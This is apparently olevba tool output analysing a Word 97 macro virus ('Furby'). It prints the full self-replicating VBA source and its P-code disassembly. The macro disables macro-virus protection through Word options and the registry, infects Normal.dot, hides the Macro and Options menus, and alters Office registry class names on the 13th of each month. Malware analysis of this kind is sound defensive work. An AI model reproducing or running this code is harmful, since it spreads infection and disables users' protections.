olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Furby.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Furby.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo furby
Randomize: Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): zz = 5: vx = 1: xv = 4: x = 0: z = 0: y = 0
rtx = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

stx = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines
If stx > Sgn(x) And rtx > Sgn(x) Then GoTo furby
If stx = Sgn(x) Then
    Set xyz = NormalTemplate.VBProject.VBComponents

    Set xhst = ActiveDocument.VBProject.VBComponents
    If Month(Now()) = 1 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Furby!"
    If Month(Now()) = 2 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Addin.8", "") = "Microsoft Furby Addin"
    If Month(Now()) = 3 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "Word Furby Document"

    If Month(Now()) = 4 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Application.8", "") = "Microsoft Furby Application"
    If Month(Now()) = 5 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Template.8", "") = "Microsoft Furby Template"
    If Month(Now()) = 6 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PowerPoint.Template.8", "") = "PowerPoint Furby Template"
    If Month(Now()) = 7 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.RTF.8", "") = "Rich Furby Format"

    If Month(Now()) = 8 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Wizard.8", "") = "Microsoft Furby Wizard"
    If Month(Now()) = 9 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Picture.8", "") = "Microsoft Furby Picture"
    If Month(Now()) = 10 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PowerPoint.Show.8", "") = "Microsoft Furby Presentation"
    If Month(Now()) = 11 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\ExcelWorksheet", "") = "Microsoft Furby Worksheet"

    If Month(Now()) = 12 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PowerPoint.Slide.8", "") = "Microsoft Furby Slide"
    xhst.Item(Cos(Atn(CInt(1)))).Name = xyz.Item(Cos(Atn(CInt(1)))).Name
    xhst.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Abs(vx) & Chr(46) + Chr(100) + Chr(108) + Chr(108)
End If

If rtx = Sgn(x) Then Set xyz = ActiveDocument.VBProject.VBComponents
xyz.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Windows.Application.Path & Abs(vx) & Chr(46) + Chr(100) + Chr(108) + Chr(108)
With xyz.Item(Cos(Atn(CInt(1)))).codemodule
    For j = Abs(vx) To Abs(xv)

    .deletelines Abs(vx)
        Next j
End With
With xyz.Item(Cos(Atn(CInt(1)))).codemodule

 For j = Abs(zz) To xyz.Item(Cos(Atn(CInt(1)))).codemodule.countoflines Step Abs(zz)
    y = Int(Rnd(412835) * 303989) + 8485
    z = Int(Rnd(487958) * 785865) + 2988
    .replaceline j, Chr(39) & y * z & Application.DisplayRecentFiles & z * y & y * z & Application.DisplayRecentFiles & Application.StartupPath

    Next j
 End With
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"

If stx = Sgn(x) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Delete
If stx = Sgn(x) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(79) + Chr(112) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(115) + Chr(46) + Chr(46) + Chr(46)).Delete
If stx = Sgn(x) Then xyz.Item(Cos(Atn(CInt(1)))).codemodule.replaceline Abs(vx), "Sub AutoClose()"
If stx = Sgn(x) And rtx = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

furby:
If stx <> Sgn(x) And rtx = Sgn(x) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'WM97/It's Furby by Virus :) Smile
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Furby.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6740 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError furby 
' Line #2:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0005 
' 	St zz 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St vx 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	St xv 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St x 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St z 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St y 
' Line #3:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St rtx 
' Line #4:
' Line #5:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St stx 
' Line #6:
' 	Ld stx 
' 	Ld x 
' 	FnSgn 
' 	Gt 
' 	Ld rtx 
' 	Ld x 
' 	FnSgn 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo furby 
' 	EndIf 
' Line #7:
' 	Ld stx 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	IfBlock 
' Line #8:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set xyz 
' Line #9:
' Line #10:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set xhst 
' Line #11:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "It's Furby!"
' 	LitStr 0x0000 ""
' 	LitStr 0x0021 "HKEY_CLASSES_ROOT\Word.Document.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #12:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0015 "Microsoft Furby Addin"
' 	LitStr 0x0000 ""
' 	LitStr 0x001E "HKEY_CLASSES_ROOT\Word.Addin.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #13:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0013 "Word Furby Document"
' 	LitStr 0x0000 ""
' 	LitStr 0x0021 "HKEY_CLASSES_ROOT\Word.Document.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #14:
' Line #15:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Microsoft Furby Application"
' 	LitStr 0x0000 ""
' 	LitStr 0x0024 "HKEY_CLASSES_ROOT\Word.Application.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #16:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Microsoft Furby Template"
' 	LitStr 0x0000 ""
' 	LitStr 0x0021 "HKEY_CLASSES_ROOT\Word.Template.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #17:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0019 "PowerPoint Furby Template"
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CLASSES_ROOT\PowerPoint.Template.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #18:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0011 "Rich Furby Format"
' 	LitStr 0x0000 ""
' 	LitStr 0x001C "HKEY_CLASSES_ROOT\Word.RTF.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #19:
' Line #20:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0016 "Microsoft Furby Wizard"
' 	LitStr 0x0000 ""
' 	LitStr 0x001F "HKEY_CLASSES_ROOT\Word.Wizard.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #21:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0017 "Microsoft Furby Picture"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CLASSES_ROOT\Word.Picture.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #22:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Microsoft Furby Presentation"
' 	LitStr 0x0000 ""
' 	LitStr 0x0023 "HKEY_CLASSES_ROOT\PowerPoint.Show.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #23:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000B 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0019 "Microsoft Furby Worksheet"
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_CLASSES_ROOT\ExcelWorksheet"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #24:
' Line #25:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0015 "Microsoft Furby Slide"
' 	LitStr 0x0000 ""
' 	LitStr 0x0024 "HKEY_CLASSES_ROOT\PowerPoint.Slide.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #26:
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld xyz 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld xhst 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #27:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	Ld vx 
' 	FnAbs 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld xhst 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #28:
' 	EndIfBlock 
' Line #29:
' Line #30:
' 	Ld rtx 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set xyz 
' 	EndIf 
' Line #31:
' 	Ld Windows 
' 	MemLd Application 
' 	MemLd Path 
' 	Ld vx 
' 	FnAbs 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld xyz 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #32:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld xyz 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #33:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld vx 
' 	FnAbs 
' 	Ld xv 
' 	FnAbs 
' 	For 
' Line #34:
' Line #35:
' 	Ld vx 
' 	FnAbs 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #36:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	EndWith 
' Line #38:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld xyz 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #39:
' Line #40:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld zz 
' 	FnAbs 
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld xyz 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld zz 
' 	FnAbs 
' 	ForStep 
' Line #41:
' 	LitDI4 0x4CA3 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0xA375 0x0004 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St y 
' Line #42:
' 	LitDI4 0x7216 0x0007 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0xFDC9 0x000B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St z 
' Line #43:
' 	Ld j 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld y 
' 	Ld z 
' 	Mul 
' 	Concat 
' 	Ld Application 
' 	MemLd DisplayRecentFiles 
' 	Concat 
' 	Ld z 
' 	Ld y 
' 	Mul 
' 	Concat 
' 	Ld y 
' 	Ld z 
' 	Mul 
' 	Concat 
' 	Ld Application 
' 	MemLd DisplayRecentFiles 
' 	Concat 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #44:
' Line #45:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	EndWith 
' Line #47:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #48:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #49:
' Line #50:
' 	Ld stx 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #51:
' 	Ld stx 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #52:
' 	Ld stx 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld vx 
' 	FnAbs 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	Coerce (Int) 
' 	ArgsLd Atn 0x0001 
' 	ArgsLd Cos 0x0001 
' 	Ld xyz 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #53:
' 	Ld stx 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	Ld rtx 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #54:
' Line #55:
' 	Label furby 
' Line #56:
' 	Ld stx 
' 	Ld x 
' 	FnSgn 
' 	Ne 
' 	Ld rtx 
' 	Ld x 
' 	FnSgn 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #57:
' 	EndSub 
' 	QuoteRem 0x0008 0x0021 "WM97/It's Furby by Virus :) Smile"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

